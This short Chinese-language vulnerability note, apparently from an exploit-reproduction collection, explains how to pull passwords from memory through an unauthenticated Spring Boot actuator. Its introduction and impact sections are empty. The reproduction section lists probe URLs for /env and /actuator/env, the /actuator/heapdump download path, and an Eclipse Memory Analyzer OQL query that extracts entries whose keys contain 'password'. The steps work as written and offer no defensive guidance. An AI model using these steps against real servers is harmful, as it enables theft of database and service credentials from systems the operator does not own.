# Spring Boot 提取内存密码

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

> 访问如下路径如果有数据说明存在漏洞

**Spring Boot 1.x版本**

`http://www.baidu.com:8090/env`

**Spring Boot 2.x版本**

`http://www.baidu.com:8090/actuator/env`

![2.png](media/202009/bb0b08f5678e408ab0361807aa8ebfcf.png)

> 当发现存在未授权漏洞时，可以直接访问 `/actuator/heapdump` 下载内存，提取密码

`http://www.baidu.com:8090/actuator/heapdump`

> heapdump文件下载完成之后可以利用Eclipse Memory Analyzer 来解析内存文件

```
http://www.eclipse.org/mat/downloads.php

```

> 匹配内存中password字符串，并不一定能匹配完，可以通过`/actuator/env`得到的`JDBC`信息再来匹配关键字

`select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))`

![1.png](media/202009/2ca70d28e68e483084bc05020e61277a.png)

